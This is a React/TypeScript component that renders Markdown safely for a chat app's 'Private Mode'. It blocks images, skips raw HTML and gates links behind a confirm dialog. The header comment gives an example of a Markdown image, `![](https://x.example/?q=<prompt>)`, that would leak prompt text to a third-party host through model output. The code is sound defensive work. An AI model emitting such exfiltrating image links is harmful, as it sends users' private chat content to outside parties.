"use client";

import { Check, Copy, ImageOff } from "lucide-react";
import {
  createContext,
  memo,
  useContext,
  useState,
  type ComponentPropsWithoutRef,
  type KeyboardEvent,
  type MouseEvent,
} from "react";
import ReactMarkdown from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";

import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { cn } from "@/lib/utils";

/**
 * Private Mode Markdown renderer.
 *
 * A default ReactMarkdown setup emits a live `<img>`, so a local answer
 * containing `![](https://x.example/?q=<prompt>)` would make the browser send
 * prompt text to a third party without the user doing anything. This renderer:
 *
 *   1. never emits an `<img>` with a `src` — images become a text placeholder
 *      showing alt text and the address (including same-origin, data: and
 *      blob: URLs);
 *   2. never renders raw HTML (no rehype-raw; `skipHtml`), so there is no
 *      iframe/video/audio/source/link/object/srcset;
 *   3. puts every link behind a confirm dialog showing the full address, with
 *      `rel="noopener noreferrer"` and `referrerpolicy="no-referrer"`, and no
 *      prefetch or ping.
 */

const SAFE_LINK = /^(https?:|mailto:)/i;

function CopyCode({ value }: { value: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      type="button"
      aria-label={copied ? "Copied" : "Copy code"}
      onClick={() => {
        void navigator.clipboard.writeText(value).then(() => {
          setCopied(true);
          setTimeout(() => setCopied(false), 1500);
        });
      }}
      className={cn(
        "text-muted-foreground hover:text-foreground hover:bg-background/80",
        "absolute top-2 right-2 rounded-md border border-transparent p-1.5",
        "opacity-0 transition group-hover:opacity-100 focus-visible:opacity-100",
      )}
    >
      {copied ? <Check className="size-3.5" /> : <Copy className="size-3.5" />}
    </button>
  );
}

function textOf(node: React.ReactNode): string {
  if (node === null || node === undefined || typeof node === "boolean") return "";
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  if (typeof node === "object" && "props" in node) {
    return textOf((node as { props: { children?: React.ReactNode } }).props.children);
  }
  return "";
}

function Pre({ children, className, ...props }: ComponentPropsWithoutRef<"pre">) {
  return (
    <div className="group relative">
      <pre className={cn("overflow-x-auto", className)} {...props}>
        {children}
      </pre>
      <CopyCode value={textOf(children)} />
    </div>
  );
}

/** Replaces every image. Deliberately has no `src`, `srcSet` or background URL. */
function BlockedImage({ alt, src }: { alt?: string; src?: unknown }) {
  const address = typeof src === "string" ? src : "";
  return (
    <span
      data-private-image-placeholder=""
      className="bg-muted text-muted-foreground my-1 inline-flex max-w-full items-center gap-1.5 rounded-md border px-2 py-1 text-xs"
    >
      <ImageOff className="size-3.5 shrink-0" aria-hidden />
      <span className="truncate">
        Image not loaded in Private Mode{alt ? `: ${alt}` : ""}
        {address ? ` (${address})` : ""}
      </span>
    </span>
  );
}

function LinkConfirm({
  href,
  onClose,
}: {
  href: string | null;
  onClose: () => void;
}) {
  const [copied, setCopied] = useState(false);
  return (
    <Dialog open={href !== null} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Open a website outside Private Mode?</DialogTitle>
          <DialogDescription>
            This opens a website outside Private Mode. The address itself may contain text from
            this chat.
          </DialogDescription>
        </DialogHeader>
        <p className="bg-muted rounded-md p-2 font-mono text-xs break-all">{href}</p>
        <DialogFooter className="gap-2">
          <Button
            variant="outline"
            onClick={() => {
              if (!href) return;
              void navigator.clipboard.writeText(href).then(() => setCopied(true));
            }}
          >
            {copied ? "Copied" : "Copy link"}
          </Button>
          <Button variant="outline" onClick={onClose}>
            Cancel
          </Button>
          <Button
            onClick={() => {
              if (href && SAFE_LINK.test(href)) window.open(href, "_blank", "noopener,noreferrer");
              onClose();
            }}
          >
            Open
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}

const ConfirmLink = createContext<(href: string) => void>(() => {});

/**
 * A link with no live `href`: the browser cannot follow, prefetch, ping or
 * middle-click it. Activating it (click, Enter, Space) opens the confirm
 * dialog, which is the only place a window is ever opened, with
 * `noopener,noreferrer`.
 */
function Anchor({ href, children }: ComponentPropsWithoutRef<"a">) {
  const confirm = useContext(ConfirmLink);
  const safe = typeof href === "string" && SAFE_LINK.test(href) ? href : null;
  if (!safe) return <span className="underline decoration-dotted">{children}</span>;
  const open = (event: MouseEvent<HTMLAnchorElement> | KeyboardEvent<HTMLAnchorElement>) => {
    event.preventDefault();
    confirm(safe);
  };
  return (
    <a
      role="link"
      tabIndex={0}
      data-private-href={safe}
      title={safe}
      rel="noopener noreferrer nofollow"
      referrerPolicy="no-referrer"
      className="cursor-pointer"
      onClick={open}
      onKeyDown={(event) => {
        if (event.key === "Enter" || event.key === " ") open(event);
      }}
    >
      {children}
    </a>
  );
}

function Img({ alt, src }: ComponentPropsWithoutRef<"img">) {
  return <BlockedImage alt={alt} src={src} />;
}

const COMPONENTS = { pre: Pre, a: Anchor, img: Img };

export const PrivateMarkdown = memo(function PrivateMarkdown({ content }: { content: string }) {
  const [pending, setPending] = useState<string | null>(null);

  return (
    <ConfirmLink.Provider value={setPending}>
      <ReactMarkdown
        skipHtml
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[[rehypeHighlight, { detect: true, ignoreMissing: true }]]}
        components={COMPONENTS}
      >
        {content}
      </ReactMarkdown>
      <LinkConfirm href={pending} onClose={() => setPending(null)} />
    </ConfirmLink.Provider>
  );
});
